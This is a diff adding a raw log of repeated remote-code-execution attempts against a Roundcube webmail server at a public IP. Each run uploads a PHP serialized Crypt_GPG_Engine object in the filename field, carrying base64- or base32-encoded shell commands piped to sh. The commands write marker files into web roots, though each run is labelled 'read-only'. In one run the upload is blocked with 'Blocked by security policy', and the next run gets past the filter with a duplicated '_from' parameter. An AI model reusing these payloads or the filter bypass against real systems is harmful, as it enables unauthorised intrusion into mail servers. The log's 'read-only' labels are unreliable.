@@ -1,0 +1,419 @@
+
+=== [2026-08-19T01:00:07.975Z (UTC)] RUN START ===
+{
+  "target": "http://13.125.104.131:30083",
+  "user": "testuser",
+  "cmd": "id",
+  "note": "safety-bounded verification run, read-only command only"
+}
+
+=== [2026-08-19T01:00:08.044Z (UTC)] GET / (version check) ===
+{
+  "status": 200,
+  "rcversion": "10610",
+  "resp_headers": {
+    "Server": "Werkzeug/3.1.8 Python/3.12.14, Apache/2.4.62 (Debian)",
+    "Date": "Wed, 19 Aug 2026 01:00:08 GMT, Wed, 19 Aug 2026 01:00:08 GMT",
+    "X-Powered-By": "PHP/8.1.32",
+    "Set-Cookie": "roundcube_sessid=l461769hqeceo2pksqvbpjsqho; path=/; HttpOnly",
+    "Expires": "Wed, 19 Aug 2026 01:00:08 GMT",
+    "Cache-Control": "private, no-cache, no-store, must-revalidate, post-check=0, pre-check=0",
+    "Pragma": "no-cache",
+    "Last-Modified": "Wed, 19 Aug 2026 01:00:08 GMT",
+    "X-Frame-Options": "sameorigin",
+    "Content-Language": "en",
+    "Vary": "Accept-Encoding",
+    "Keep-Alive": "timeout=5, max=100",
+    "Content-Type": "text/html; charset=UTF-8",
+    "Content-Length": "5327",
+    "Connection": "close"
+  }
+}
+
+=== [2026-08-19T01:00:08.313Z (UTC)] POST login ===
+{
+  "status": 302,
+  "location": "/?_task=mail&_token=tM7Mhf3OJZkKOoJWHAfU4icOZynizSBA",
+  "set_cookie": "roundcube_sessauth=-del-; expires=Wed, 19-Aug-2026 00:59:08 GMT; Max-Age=0; path=/; HttpOnly, roundcube_sessid=i02l4jam87su5mp5mieh6hq9od; path=/; HttpOnly, roundcube_sessauth=pppFdrSD1OslI9oOCaYj4CVgUd-1787101200; path=/; HttpOnly"
+}
+
+=== [2026-08-19T01:00:08.313Z (UTC)] SERIALIZED PAYLOAD (filename field) ===
+|O:17:"Crypt_GPG_Engine":3:{s:9:"\x00*\x00_process";b:0;s:8:"\x00*\x00_gpgconf";s:26:"echo "aWQ="|base64 -d|sh;#";s:8:"\x00*\x00_homedir";s:0:"";};
+
+=== [2026-08-19T01:00:08.389Z (UTC)] POST upload (exploit attempt) ===
+{
+  "url": "http://13.125.104.131:30083/?_task=settings&_framed=1&_remote=1&_from=edit-1&_from=edit-!xxx&_id=&_uploadid=upload1337&_unlock=upload1337&_action=upload",
+  "status": 200,
+  "resp_headers": {
+    "Server": "Werkzeug/3.1.8 Python/3.12.14, Apache/2.4.62 (Debian)",
+    "Date": "Wed, 19 Aug 2026 01:00:08 GMT, Wed, 19 Aug 2026 01:00:08 GMT",
+    "X-Powered-By": "PHP/8.1.32",
+    "Expires": "Wed, 19 Aug 2026 01:00:08 GMT",
+    "Cache-Control": "private, no-cache, no-store, must-revalidate, post-check=0, pre-check=0",
+    "Pragma": "no-cache",
+    "Last-Modified": "Wed, 19 Aug 2026 01:00:08 GMT",
+    "X-DNS-Prefetch-Control": "off",
+    "Referrer-Policy": "same-origin",
+    "X-Frame-Options": "sameorigin",
+    "Vary": "Accept-Encoding",
+    "Keep-Alive": "timeout=5, max=100",
+    "Content-Type": "application/json; charset=UTF-8",
+    "Content-Length": "241",
+    "Connection": "close"
+  },
+  "resp_body_first_2000": "{\"action\":\"upload\",\"unlock\":\"upload1337\",\"exec\":\"this.add2attachment_list(\\\"rcmfile21787101208042574500\\\",{\\\"html\\\":\\\"|O:17:\\\",\\\"name\\\":\\\"|O:17:\\\",\\\"mimetype\\\":\\\"image/png\\\",\\\"classname\\\":\\\"image png\\\",\\\"complete\\\":true},\\\"upload1337\\\");\\n\"}"
+}
+
+=== [2026-08-19T01:00:08.390Z (UTC)] RUN END ===
+done
+
+=== [2026-08-19T01:03:09.470Z (UTC)] RUN START ===
+{
+  "target": "http://13.125.104.131:30083",
+  "user": "testuser",
+  "cmd": "id > /var/www/html/.rce_verify_20260819T010309Z.txt 2>&1; id > /var/www/roundcube/.rce_verify_20260819T010309Z.txt 2>&1; id > /usr/share/roundcube/public_html/.rce_verify_20260819T010309Z.txt 2>&1; id > /app/public/.rce_verify_20260819T010309Z.txt 2>&1; id > /srv/www/roundcube/.rce_verify_20260819T010309Z.txt 2>&1; id > /var/www/html/webmail/.rce_verify_20260819T010309Z.txt 2>&1; echo done > /tmp/.rce_verify_20260819T010309Z.done 2>&1",
+  "note": "safety-bounded verification run, read-only command only"
+}
+
+=== [2026-08-19T01:03:09.565Z (UTC)] GET / (version check) ===
+{
+  "status": 200,
+  "rcversion": "10610",
+  "resp_headers": {
+    "Server": "Werkzeug/3.1.8 Python/3.12.14, Apache/2.4.62 (Debian)",
+    "Date": "Wed, 19 Aug 2026 01:03:09 GMT, Wed, 19 Aug 2026 01:03:09 GMT",
+    "X-Powered-By": "PHP/8.1.32",
+    "Set-Cookie": "roundcube_sessid=1r9j31cm063if34s3g7arohfm7; path=/; HttpOnly",
+    "Expires": "Wed, 19 Aug 2026 01:03:09 GMT",
+    "Cache-Control": "private, no-cache, no-store, must-revalidate, post-check=0, pre-check=0",
+    "Pragma": "no-cache",
+    "Last-Modified": "Wed, 19 Aug 2026 01:03:09 GMT",
+    "X-Frame-Options": "sameorigin",
+    "Content-Language": "en",
+    "Vary": "Accept-Encoding",
+    "Keep-Alive": "timeout=5, max=100",
+    "Content-Type": "text/html; charset=UTF-8",
+    "Content-Length": "5327",
+    "Connection": "close"
+  }
+}
+
+=== [2026-08-19T01:03:09.954Z (UTC)] POST login ===
+{
+  "status": 302,
+  "location": "/?_task=mail&_token=9BeQMW8mS0hLS5R3KoqXlWJ9HhKS3nBI",
+  "set_cookie": "roundcube_sessauth=-del-; expires=Wed, 19-Aug-2026 01:02:09 GMT; Max-Age=0; path=/; HttpOnly, roundcube_sessid=9218rkrssblm120r2e5u75to9t; path=/; HttpOnly, roundcube_sessauth=5sLo12lrPMP4XUlYf9Cj0gnBmq-1787101200; path=/; HttpOnly"
+}
+
+=== [2026-08-19T01:03:09.954Z (UTC)] SERIALIZED PAYLOAD (filename field) ===
+|O:17:"Crypt_GPG_Engine":3:{s:9:"\x00*\x00_process";b:0;s:8:"\x00*\x00_gpgconf";s:606:"echo "aWQgPiAvdmFyL3d3dy9odG1sLy5yY2VfdmVyaWZ5XzIwMjYwODE5VDAxMDMwOVoudHh0IDI+JjE7IGlkID4gL3Zhci93d3cvcm91bmRjdWJlLy5yY2VfdmVyaWZ5XzIwMjYwODE5VDAxMDMwOVoudHh0IDI+JjE7IGlkID4gL3Vzci9zaGFyZS9yb3VuZGN1YmUvcHVibGljX2h0bWwvLnJjZV92ZXJpZnlfMjAyNjA4MTlUMDEwMzA5Wi50eHQgMj4mMTsgaWQgPiAvYXBwL3B1YmxpYy8ucmNlX3ZlcmlmeV8yMDI2MDgxOVQwMTAzMDlaLnR4dCAyPiYxOyBpZCA+IC9zcnYvd3d3L3JvdW5kY3ViZS8ucmNlX3ZlcmlmeV8yMDI2MDgxOVQwMTAzMDlaLnR4dCAyPiYxOyBpZCA+IC92YXIvd3d3L2h0bWwvd2VibWFpbC8ucmNlX3ZlcmlmeV8yMDI2MDgxOVQwMTAzMDlaLnR4dCAyPiYxOyBlY2hvIGRvbmUgPiAvdG1wLy5yY2VfdmVyaWZ5XzIwMjYwODE5VDAxMDMwOVouZG9uZSAyPiYx"|base64 -d|sh;#";s:8:"\x00*\x00_homedir";s:0:"";};
+
+=== [2026-08-19T01:03:10.044Z (UTC)] POST upload (exploit attempt) ===
+{
+  "url": "http://13.125.104.131:30083/?_task=settings&_framed=1&_remote=1&_from=edit-1&_from=edit-!xxx&_id=&_uploadid=upload1337&_unlock=upload1337&_action=upload",
+  "status": 200,
+  "resp_headers": {
+    "Server": "Werkzeug/3.1.8 Python/3.12.14, Apache/2.4.62 (Debian)",
+    "Date": "Wed, 19 Aug 2026 01:03:10 GMT, Wed, 19 Aug 2026 01:03:10 GMT",
+    "X-Powered-By": "PHP/8.1.32",
+    "Expires": "Wed, 19 Aug 2026 01:03:10 GMT",
+    "Cache-Control": "private, no-cache, no-store, must-revalidate, post-check=0, pre-check=0",
+    "Pragma": "no-cache",
+    "Last-Modified": "Wed, 19 Aug 2026 01:03:10 GMT",
+    "X-DNS-Prefetch-Control": "off",
+    "Referrer-Policy": "same-origin",
+    "X-Frame-Options": "sameorigin",
+    "Vary": "Accept-Encoding",
+    "Keep-Alive": "timeout=5, max=100",
+    "Content-Type": "application/json; charset=UTF-8",
+    "Content-Length": "241",
+    "Connection": "close"
+  },
+  "resp_body_first_2000": "{\"action\":\"upload\",\"unlock\":\"upload1337\",\"exec\":\"this.add2attachment_list(\\\"rcmfile21787101390007909500\\\",{\\\"html\\\":\\\"|O:17:\\\",\\\"name\\\":\\\"|O:17:\\\",\\\"mimetype\\\":\\\"image/png\\\",\\\"classname\\\":\\\"image png\\\",\\\"complete\\\":true},\\\"upload1337\\\");\\n\"}"
+}
+
+=== [2026-08-19T01:03:10.172Z (UTC)] VERIFY GET marker file ===
+{
+  "url": "http://13.125.104.131:30083/.rce_verify_20260819T010309Z.txt",
+  "status": 404,
+  "body": null
+}
+
+=== [2026-08-19T01:03:10.173Z (UTC)] RUN END ===
+done
+
+=== [2026-08-19T01:09:15.431Z (UTC)] RUN START ===
+{
+  "target": "http://13.125.104.131:30083",
+  "user": "testuser",
+  "cmd": "id > /var/www/html/.rce_verify_20260819T010915Z.txt 2>&1; id > /var/www/roundcube/.rce_verify_20260819T010915Z.txt 2>&1; id > /usr/share/roundcube/public_html/.rce_verify_20260819T010915Z.txt 2>&1; id > /app/public/.rce_verify_20260819T010915Z.txt 2>&1; id > /srv/www/roundcube/.rce_verify_20260819T010915Z.txt 2>&1; id > /var/www/html/webmail/.rce_verify_20260819T010915Z.txt 2>&1; echo done > /tmp/.rce_verify_20260819T010915Z.done 2>&1",
+  "note": "safety-bounded verification run, read-only command only, corrected serialization vs. previous attempt"
+}
+
+=== [2026-08-19T01:09:15.765Z (UTC)] GET / (version check) ===
+{
+  "status": 200,
+  "rcversion": "10610",
+  "resp_headers": {
+    "Server": "Werkzeug/3.1.8 Python/3.12.14, Apache/2.4.62 (Debian)",
+    "Date": "Wed, 19 Aug 2026 01:09:15 GMT, Wed, 19 Aug 2026 01:09:15 GMT",
+    "X-Powered-By": "PHP/8.1.32",
+    "Set-Cookie": "roundcube_sessid=j05qcs9fv49fbljldbdigja0uc; path=/; HttpOnly",
+    "Expires": "Wed, 19 Aug 2026 01:09:15 GMT",
+    "Cache-Control": "private, no-cache, no-store, must-revalidate, post-check=0, pre-check=0",
+    "Pragma": "no-cache",
+    "Last-Modified": "Wed, 19 Aug 2026 01:09:15 GMT",
+    "X-Frame-Options": "sameorigin",
+    "Content-Language": "en",
+    "Vary": "Accept-Encoding",
+    "Keep-Alive": "timeout=5, max=100",
+    "Content-Type": "text/html; charset=UTF-8",
+    "Content-Length": "5327",
+    "Connection": "close"
+  }
+}
+
+=== [2026-08-19T01:09:16.041Z (UTC)] POST login ===
+{
+  "status": 302,
+  "location": "/?_task=mail&_token=Q2bcAd4j1SFwzc0DUxCjW5edfGt3Bv35",
+  "set_cookie": "roundcube_sessauth=-del-; expires=Wed, 19-Aug-2026 01:08:15 GMT; Max-Age=0; path=/; HttpOnly, roundcube_sessid=dmdd8iim65ikc9hfumc8q35298; path=/; HttpOnly, roundcube_sessauth=ehWU0D1oq3RJmy7eNgc0rWkiij-1787101500; path=/; HttpOnly"
+}
+
+=== [2026-08-19T01:09:44.401Z (UTC)] RUN START ===
+{
+  "target": "http://13.125.104.131:30083",
+  "user": "testuser",
+  "cmd": "id > /var/www/html/.rce_verify_20260819T010944Z.txt 2>&1; id > /var/www/roundcube/.rce_verify_20260819T010944Z.txt 2>&1; id > /usr/share/roundcube/public_html/.rce_verify_20260819T010944Z.txt 2>&1; id > /app/public/.rce_verify_20260819T010944Z.txt 2>&1; id > /srv/www/roundcube/.rce_verify_20260819T010944Z.txt 2>&1; id > /var/www/html/webmail/.rce_verify_20260819T010944Z.txt 2>&1; echo done > /tmp/.rce_verify_20260819T010944Z.done 2>&1",
+  "note": "safety-bounded verification run, read-only command only, corrected serialization vs. previous attempt"
+}
+
+=== [2026-08-19T01:09:44.498Z (UTC)] GET / (version check) ===
+{
+  "status": 200,
+  "rcversion": "10610",
+  "resp_headers": {
+    "Server": "Werkzeug/3.1.8 Python/3.12.14, Apache/2.4.62 (Debian)",
+    "Date": "Wed, 19 Aug 2026 01:09:44 GMT, Wed, 19 Aug 2026 01:09:44 GMT",
+    "X-Powered-By": "PHP/8.1.32",
+    "Set-Cookie": "roundcube_sessid=1f45rbui8r2j4qi2vpqu9d0h2k; path=/; HttpOnly",
+    "Expires": "Wed, 19 Aug 2026 01:09:44 GMT",
+    "Cache-Control": "private, no-cache, no-store, must-revalidate, post-check=0, pre-check=0",
+    "Pragma": "no-cache",
+    "Last-Modified": "Wed, 19 Aug 2026 01:09:44 GMT",
+    "X-Frame-Options": "sameorigin",
+    "Content-Language": "en",
+    "Vary": "Accept-Encoding",
+    "Keep-Alive": "timeout=5, max=100",
+    "Content-Type": "text/html; charset=UTF-8",
+    "Content-Length": "5327",
+    "Connection": "close"
+  }
+}
+
+=== [2026-08-19T01:09:44.878Z (UTC)] POST login ===
+{
+  "status": 302,
+  "location": "/?_task=mail&_token=8Oouu183RvGCpQpdaZqKoWOhl5vv245I",
+  "set_cookie": "roundcube_sessauth=-del-; expires=Wed, 19-Aug-2026 01:08:44 GMT; Max-Age=0; path=/; HttpOnly, roundcube_sessid=jnna0rqkk2k9itr4gv9er8b7e6; path=/; HttpOnly, roundcube_sessauth=yaPyxkVpfX2CY35mtDzuTfVVfv-1787101500; path=/; HttpOnly"
+}
+
+=== [2026-08-19T01:09:44.878Z (UTC)] SERIALIZED PAYLOAD (filename field, quote-escaped) ===
+|O:16:\"Crypt_GPG_Engine\":3:{s:8:\"_process\";b:0;s:8:\"_gpgconf\";s:727:\"echo \"NFSCAPRAF53GC4RPO53XOL3IORWWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTAOJUGRNC45DYOQQDEPRGGE5SA2LEEA7CAL3WMFZC653XO4XXE33VNZSGG5LCMUXS44TDMVPXMZLSNFTHSXZSGAZDMMBYGE4VIMBRGA4TINC2FZ2HQ5BAGI7CMMJ3EBUWIIB6EAXXK43SF5ZWQYLSMUXXE33VNZSGG5LCMUXXA5LCNRUWGX3IORWWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTAOJUGRNC45DYOQQDEPRGGE5SA2LEEA7CAL3BOBYC64DVMJWGSYZPFZZGGZK7OZSXE2LGPFPTEMBSGYYDQMJZKQYDCMBZGQ2FULTUPB2CAMR6EYYTWIDJMQQD4IBPONZHML3XO53S64TPOVXGIY3VMJSS6LTSMNSV65TFOJUWM6K7GIYDENRQHAYTSVBQGEYDSNBULIXHI6DUEAZD4JRRHMQGSZBAHYQC65TBOIXXO53XF5UHI3LMF53WKYTNMFUWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTAOJUGRNC45DYOQQDEPRGGE5SAZLDNBXSAZDPNZSSAPRAF52G24BPFZZGGZK7OZSXE2LGPFPTEMBSGYYDQMJZKQYDCMBZGQ2FULTEN5XGKIBSHYTDC===\"|base32 -d|sh &#\";s:8:\"_homedir\";s:0:\"\";};
+
+=== [2026-08-19T01:09:44.965Z (UTC)] POST upload (exploit attempt) ===
+{
+  "url": "http://13.125.104.131:30083/?_task=settings&_remote=1&_from=edit-!verify&_id=&_uploadid=upload1337&_unlock=upload1337&_action=upload",
+  "status": 403,
+  "resp_headers": {
+    "Server": "Werkzeug/3.1.8 Python/3.12.14",
+    "Date": "Wed, 19 Aug 2026 01:09:45 GMT",
+    "Content-Type": "text/html; charset=utf-8",
+    "Content-Length": "26",
+    "Connection": "close"
+  },
+  "resp_body_first_2000": "Blocked by security policy"
+}
+
+=== [2026-08-19T01:09:45.055Z (UTC)] VERIFY GET marker file ===
+{
+  "url": "http://13.125.104.131:30083/.rce_verify_20260819T010944Z.txt",
+  "status": 404,
+  "body": null
+}
+
+=== [2026-08-19T01:09:45.055Z (UTC)] RUN END ===
+done
+
+=== [2026-08-19T01:10:18.934Z (UTC)] RUN START ===
+{
+  "target": "http://13.125.104.131:30083",
+  "user": "testuser",
+  "cmd": "id > /var/www/html/.rce_verify_20260819T011018Z.txt 2>&1; id > /var/www/roundcube/.rce_verify_20260819T011018Z.txt 2>&1; id > /usr/share/roundcube/public_html/.rce_verify_20260819T011018Z.txt 2>&1; id > /app/public/.rce_verify_20260819T011018Z.txt 2>&1; id > /srv/www/roundcube/.rce_verify_20260819T011018Z.txt 2>&1; id > /var/www/html/webmail/.rce_verify_20260819T011018Z.txt 2>&1; echo done > /tmp/.rce_verify_20260819T011018Z.done 2>&1",
+  "note": "safety-bounded verification run, read-only command only, corrected serialization vs. previous attempt"
+}
+
+=== [2026-08-19T01:10:19.035Z (UTC)] GET / (version check) ===
+{
+  "status": 200,
+  "rcversion": "10610",
+  "resp_headers": {
+    "Server": "Werkzeug/3.1.8 Python/3.12.14, Apache/2.4.62 (Debian)",
+    "Date": "Wed, 19 Aug 2026 01:10:19 GMT, Wed, 19 Aug 2026 01:10:19 GMT",
+    "X-Powered-By": "PHP/8.1.32",
+    "Set-Cookie": "roundcube_sessid=cqi0i5v33t1ditq9h8662dr7pp; path=/; HttpOnly",
+    "Expires": "Wed, 19 Aug 2026 01:10:19 GMT",
+    "Cache-Control": "private, no-cache, no-store, must-revalidate, post-check=0, pre-check=0",
+    "Pragma": "no-cache",
+    "Last-Modified": "Wed, 19 Aug 2026 01:10:19 GMT",
+    "X-Frame-Options": "sameorigin",
+    "Content-Language": "en",
+    "Vary": "Accept-Encoding",
+    "Keep-Alive": "timeout=5, max=100",
+    "Content-Type": "text/html; charset=UTF-8",
+    "Content-Length": "5327",
+    "Connection": "close"
+  }
+}
+
+=== [2026-08-19T01:10:19.362Z (UTC)] POST login ===
+{
+  "status": 302,
+  "location": "/?_task=mail&_token=4dQIEwu4sE1bY1rHYi71eibwe1PYNlNL",
+  "set_cookie": "roundcube_sessauth=-del-; expires=Wed, 19-Aug-2026 01:09:19 GMT; Max-Age=0; path=/; HttpOnly, roundcube_sessid=n1sjsn64mnqj0perli6g7u230d; path=/; HttpOnly, roundcube_sessauth=YxufCwF8rtgqc11XIz20JA7agf-1787101800; path=/; HttpOnly"
+}
+
+=== [2026-08-19T01:10:19.363Z (UTC)] SERIALIZED PAYLOAD (filename field, quote-escaped) ===
+|O:16:\"Crypt_GPG_Engine\":3:{s:8:\"_process\";b:0;s:8:\"_gpgconf\";s:727:\"echo \"NFSCAPRAF53GC4RPO53XOL3IORWWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBRHBNC45DYOQQDEPRGGE5SA2LEEA7CAL3WMFZC653XO4XXE33VNZSGG5LCMUXS44TDMVPXMZLSNFTHSXZSGAZDMMBYGE4VIMBRGEYDCOC2FZ2HQ5BAGI7CMMJ3EBUWIIB6EAXXK43SF5ZWQYLSMUXXE33VNZSGG5LCMUXXA5LCNRUWGX3IORWWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBRHBNC45DYOQQDEPRGGE5SA2LEEA7CAL3BOBYC64DVMJWGSYZPFZZGGZK7OZSXE2LGPFPTEMBSGYYDQMJZKQYDCMJQGE4FULTUPB2CAMR6EYYTWIDJMQQD4IBPONZHML3XO53S64TPOVXGIY3VMJSS6LTSMNSV65TFOJUWM6K7GIYDENRQHAYTSVBQGEYTAMJYLIXHI6DUEAZD4JRRHMQGSZBAHYQC65TBOIXXO53XF5UHI3LMF53WKYTNMFUWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBRHBNC45DYOQQDEPRGGE5SAZLDNBXSAZDPNZSSAPRAF52G24BPFZZGGZK7OZSXE2LGPFPTEMBSGYYDQMJZKQYDCMJQGE4FULTEN5XGKIBSHYTDC===\"|base32 -d|sh &#\";s:8:\"_homedir\";s:0:\"\";};
+
+=== [2026-08-19T01:10:19.463Z (UTC)] POST upload (exploit attempt) ===
+{
+  "url": "http://13.125.104.131:30083/?_task=settings&_remote=1&_from=edit-safe&_from=edit-!verify&_id=&_uploadid=upload1337&_unlock=upload1337&_action=upload",
+  "status": 200,
+  "resp_headers": {
+    "Server": "Werkzeug/3.1.8 Python/3.12.14, Apache/2.4.62 (Debian)",
+    "Date": "Wed, 19 Aug 2026 01:10:19 GMT, Wed, 19 Aug 2026 01:10:19 GMT",
+    "X-Powered-By": "PHP/8.1.32",
+    "Expires": "Wed, 19 Aug 2026 01:10:19 GMT",
+    "Cache-Control": "private, no-cache, no-store, must-revalidate, post-check=0, pre-check=0",
+    "Pragma": "no-cache",
+    "Last-Modified": "Wed, 19 Aug 2026 01:10:19 GMT",
+    "X-DNS-Prefetch-Control": "off",
+    "Referrer-Policy": "same-origin",
+    "X-Frame-Options": "sameorigin",
+    "Vary": "Accept-Encoding",
+    "Keep-Alive": "timeout=5, max=100",
+    "Content-Type": "application/json; charset=UTF-8",
+    "Content-Length": "1989",
+    "Connection": "close"
+  },
+  "resp_body_first_2000": "{\"action\":\"upload\",\"unlock\":\"upload1337\",\"exec\":\"this.add2attachment_list(\\\"rcmfile21787101819049995800\\\",{\\\"html\\\":\\\"|O:16:&quot;Crypt_GPG_Engine&quot;:3:{s:8:&quot;_process&quot;;b:0;s:8:&quot;_gpgconf&quot;;s:727:&quot;echo &quot;NFSCAPRAF53GC4RPO53XOL3IORWWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBRHBNC45DYOQQDEPRGGE5SA2LEEA7CAL3WMFZC653XO4XXE33VNZSGG5LCMUXS44TDMVPXMZLSNFTHSXZSGAZDMMBYGE4VIMBRGEYDCOC2FZ2HQ5BAGI7CMMJ3EBUWIIB6EAXXK43SF5ZWQYLSMUXXE33VNZSGG5LCMUXXA5LCNRUWGX3IORWWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBRHBNC45DYOQQDEPRGGE5SA2LEEA7CAL3BOBYC64DVMJWGSYZPFZZGGZK7OZSXE2LGPFPTEMBSGYYDQMJZKQYDCMJQGE4FULTUPB2CAMR6EYYTWIDJMQQD4IBPONZHML3XO53S64TPOVXGIY3VMJSS6LTSMNSV65TFOJUWM6K7GIYDENRQHAYTSVBQGEYTAMJYLIXHI6DUEAZD4JRRHMQGSZBAHYQC65TBOIXXO53XF5UHI3LMF53WKYTNMFUWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBRHBNC45DYOQQDEPRGGE5SAZLDNBXSAZDPNZSSAPRAF52G24BPFZZGGZK7OZSXE2LGPFPTEMBSGYYDQMJZKQYDCMJQGE4FULTEN5XGKIBSHYTDC===&quot;|base32 -d|sh &amp;#&quot;;s:8:&quot;_homedir&quot;;s:0:&quot;&quot;;};\\\",\\\"name\\\":\\\"|O:16:\\\\\\\"Crypt_GPG_Engine\\\\\\\":3:{s:8:\\\\\\\"_process\\\\\\\";b:0;s:8:\\\\\\\"_gpgconf\\\\\\\";s:727:\\\\\\\"echo \\\\\\\"NFSCAPRAF53GC4RPO53XOL3IORWWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBRHBNC45DYOQQDEPRGGE5SA2LEEA7CAL3WMFZC653XO4XXE33VNZSGG5LCMUXS44TDMVPXMZLSNFTHSXZSGAZDMMBYGE4VIMBRGEYDCOC2FZ2HQ5BAGI7CMMJ3EBUWIIB6EAXXK43SF5ZWQYLSMUXXE33VNZSGG5LCMUXXA5LCNRUWGX3IORWWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBRHBNC45DYOQQDEPRGGE5SA2LEEA7CAL3BOBYC64DVMJWGSYZPFZZGGZK7OZSXE2LGPFPTEMBSGYYDQMJZKQYDCMJQGE4FULTUPB2CAMR6EYYTWIDJMQQD4IBPONZHML3XO53S64TPOVXGIY3VMJSS6LTSMNSV65TFOJUWM6K7GIYDENRQHAYTSVBQGEYTAMJYLIXHI6DUEAZD4JRRHMQGSZBAHYQC65TBOIXXO53XF5UHI3LMF53WKYTNMFUWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBRHBNC45DYOQQDEPRGGE5SAZLDNBXSAZDPNZSSAPRAF52G24BPFZZGGZK7OZSXE2LGPFPTEMBSGYYDQMJZKQYDCMJQGE4FULTEN5XGKIBSHYTDC===\\\\\\\"|base32 -d|sh &#\\\\\\\";s:8:\\\\\\\"_homedir\\\\\\\";s:0:\\\\\\\"\\\\\\\";};\\\",\\\"mimetype\\\":\\\"image/png\\\",\\\"classname\\\":\\\"image png\\\",\\\"complete\\\":true},\\\"upload1337\\\");\\n\"}"
+}
+
+=== [2026-08-19T01:10:19.567Z (UTC)] VERIFY GET marker file ===
+{
+  "url": "http://13.125.104.131:30083/.rce_verify_20260819T011018Z.txt",
+  "status": 404,
+  "body": null
+}
+
+=== [2026-08-19T01:10:19.568Z (UTC)] RUN END ===
+done
+
+=== [2026-08-19T01:10:47.946Z (UTC)] RUN START ===
+{
+  "target": "http://13.125.104.131:30083",
+  "user": "testuser",
+  "cmd": "id > /var/www/html/.rce_verify_20260819T011047Z.txt 2>&1; id > /var/www/roundcube/.rce_verify_20260819T011047Z.txt 2>&1; id > /usr/share/roundcube/public_html/.rce_verify_20260819T011047Z.txt 2>&1; id > /app/public/.rce_verify_20260819T011047Z.txt 2>&1; id > /srv/www/roundcube/.rce_verify_20260819T011047Z.txt 2>&1; id > /var/www/html/webmail/.rce_verify_20260819T011047Z.txt 2>&1; echo done > /tmp/.rce_verify_20260819T011047Z.done 2>&1",
+  "note": "safety-bounded verification run, read-only command only, corrected serialization vs. previous attempt"
+}
+
+=== [2026-08-19T01:10:48.225Z (UTC)] GET / (version check) ===
+{
+  "status": 200,
+  "rcversion": "10610",
+  "resp_headers": {
+    "Server": "Werkzeug/3.1.8 Python/3.12.14, Apache/2.4.62 (Debian)",
+    "Date": "Wed, 19 Aug 2026 01:10:48 GMT, Wed, 19 Aug 2026 01:10:48 GMT",
+    "X-Powered-By": "PHP/8.1.32",
+    "Set-Cookie": "roundcube_sessid=l8n216f9h26li0e7umqbufkd1p; path=/; HttpOnly",
+    "Expires": "Wed, 19 Aug 2026 01:10:48 GMT",
+    "Cache-Control": "private, no-cache, no-store, must-revalidate, post-check=0, pre-check=0",
+    "Pragma": "no-cache",
+    "Last-Modified": "Wed, 19 Aug 2026 01:10:48 GMT",
+    "X-Frame-Options": "sameorigin",
+    "Content-Language": "en",
+    "Vary": "Accept-Encoding",
+    "Keep-Alive": "timeout=5, max=100",
+    "Content-Type": "text/html; charset=UTF-8",
+    "Content-Length": "5327",
+    "Connection": "close"
+  }
+}
+
+=== [2026-08-19T01:10:48.524Z (UTC)] POST login ===
+{
+  "status": 302,
+  "location": "/?_task=mail&_token=g1p57mzcACOW0bmVCkAfhVpJLPERU64D",
+  "set_cookie": "roundcube_sessauth=-del-; expires=Wed, 19-Aug-2026 01:09:48 GMT; Max-Age=0; path=/; HttpOnly, roundcube_sessid=h6s4pleb7lf9olucip0ii6i6v6; path=/; HttpOnly, roundcube_sessauth=ip4v4egM2mV841ghosa4Jto2a7-1787101800; path=/; HttpOnly"
+}
+
+=== [2026-08-19T01:10:48.524Z (UTC)] SERIALIZED PAYLOAD (filename field, quote-escaped) ===
+|O:16:\"Crypt_GPG_Engine\":3:{s:8:\"_process\";b:0;s:8:\"_gpgconf\";s:727:\"echo \"NFSCAPRAF53GC4RPO53XOL3IORWWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBUG5NC45DYOQQDEPRGGE5SA2LEEA7CAL3WMFZC653XO4XXE33VNZSGG5LCMUXS44TDMVPXMZLSNFTHSXZSGAZDMMBYGE4VIMBRGEYDIN22FZ2HQ5BAGI7CMMJ3EBUWIIB6EAXXK43SF5ZWQYLSMUXXE33VNZSGG5LCMUXXA5LCNRUWGX3IORWWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBUG5NC45DYOQQDEPRGGE5SA2LEEA7CAL3BOBYC64DVMJWGSYZPFZZGGZK7OZSXE2LGPFPTEMBSGYYDQMJZKQYDCMJQGQ3VULTUPB2CAMR6EYYTWIDJMQQD4IBPONZHML3XO53S64TPOVXGIY3VMJSS6LTSMNSV65TFOJUWM6K7GIYDENRQHAYTSVBQGEYTANBXLIXHI6DUEAZD4JRRHMQGSZBAHYQC65TBOIXXO53XF5UHI3LMF53WKYTNMFUWYLZOOJRWKX3WMVZGSZTZL4ZDAMRWGA4DCOKUGAYTCMBUG5NC45DYOQQDEPRGGE5SAZLDNBXSAZDPNZSSAPRAF52G24BPFZZGGZK7OZSXE2LGPFPTEMBSGYYDQMJZKQYDCMJQGQ3VULTEN5XGKIBSHYTDC===\"|base32 -d|sh &#\";s:8:\"_homedir\";s:0:\"\";};
+
+=== [2026-08-19T01:10:48.602Z (UTC)] POST upload (exploit attempt) ===
+{
+  "url": "http://13.125.104.131:30083/?_task=settings&_remote=1&_from=edit-safe&_from=edit-!verify&_id=&_uploadid=upload1337&_unlock=upload1337&_action=upload",
+  "status": 200,
+  "resp_headers": {
+    "Server": "Werkzeug/3.1.8 Python/3.12.14, Apache/2.4.62 (Debian)",
+    "Date": "Wed, 19 Aug 2026 01:10:48 GMT, Wed, 19 Aug 2026 01:10:48 GMT",
+    "X-Powered-By": "PHP/8.1.32",
+    "Expires": "Wed, 19 Aug 2026 01:10:48 GMT",
